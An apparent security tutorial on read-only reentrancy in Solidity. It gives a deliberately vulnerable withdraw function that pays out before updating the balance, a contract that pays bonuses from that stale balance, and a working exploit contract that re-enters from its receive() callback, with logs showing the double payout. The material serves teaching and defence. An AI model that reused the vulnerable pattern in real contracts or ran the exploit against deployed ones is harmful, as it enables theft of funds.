# Read-Only Reentrancy

## Summary

Unlike `Cross-Contract Reentrancy` which vulnerability depends on smart contracts sharing the same **state variables**, the `Read-Only Reentrancy` relies on Smart Contract that read a **not-updated-yet state variables** from another contraact.

We are going to take a look at this 2 simple smart contracts, the first smart contract has a `reentrancy vulnerability`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract ReentrancyVuln{
    mapping (address => uint256) public balances;

    constructor() payable{}

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawAll() public{
        uint toWithdraw = balances[msg.sender];
        (bool sent, ) = msg.sender.call{value: toWithdraw}("");
        require(sent);
        balances[msg.sender] = 0;
    }

}
```

The Second smart contract is actually using the state variable of `balances` from the `ReentrancyVuln` smart contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./vr.sol";

contract StateReader{

    ReentrancyVuln public rv;

    constructor(address payable _rv) payable {
        rv = ReentrancyVuln(_rv);
    }

    function bonus() public {
        uint bonusToPay = rv.balances(msg.sender);
        (bool sent, ) = msg.sender.call{value: bonusToPay}("");
        require(sent);
    }
}
```

The attack idea here is first, we know that the `withdrawAll()` function is not following `CEI Pattern` which is of course introduce the reentrancy problems, the second is, when we receive the callback, the `balances` variable has not been updated yet, meaning if here we call the `bonus()` function on the `StateReader` contract, we will get another 1 Ether because we get paid as much as our current `balances`, which hasn't been updated yet.

Using this attack Idea, we can craft an exploit just like this

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./vr.sol";
import "./sr.sol";
import "hardhat/console.sol";

contract exploiter{
    ReentrancyVuln public vr;
    StateReader public sr;

    constructor(address payable _vr, address payable _sr) {
        vr = ReentrancyVuln(_vr);
        sr = StateReader(_sr);
    }

    function attacks() public payable{
        vr.deposit{value: 1 ether}();
        vr.withdrawAll();
    }

    receive() external payable { 
        if(msg.sender == address(vr)){
            console.log("receiving 1 ether from ", msg.sender);
            sr.bonus();
        }else{
            console.log("receiving 1 ether from ", msg.sender);
        }
    }
}
```

Running the `attacks()` will pop 2 console logs with this message to inform us which Ether comes from which smart contract.

```bash
console.log:
receiving 1 ether from 0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01 (ReentrancyVuln)
receiving 1 ether from 0x0498B7c793D7432Cd9dB27fb02fc9cfdBAfA1Fd3 (StateReader)
```

## References

- [Reentrancy](https://scsfg.io/hackers/reentrancy/)
- [What is Read-Only Reentrancy](https://www.halborn.com/blog/post/what-is-read-only-reentrancy)
- [Read-Only Reentrancy Presentation @DevCon 6 Bogota](https://archive.devcon.org/archive/watch/6/read-only-reentrancy-a-novel-vulnerability-class-responsible-for-100m-funds-at-risk/?tab=YouTube)
- [The Ultimate Guide to Reentrancy](https://medium.com/immunefi/the-ultimate-guide-to-reentrancy-19526f105ac)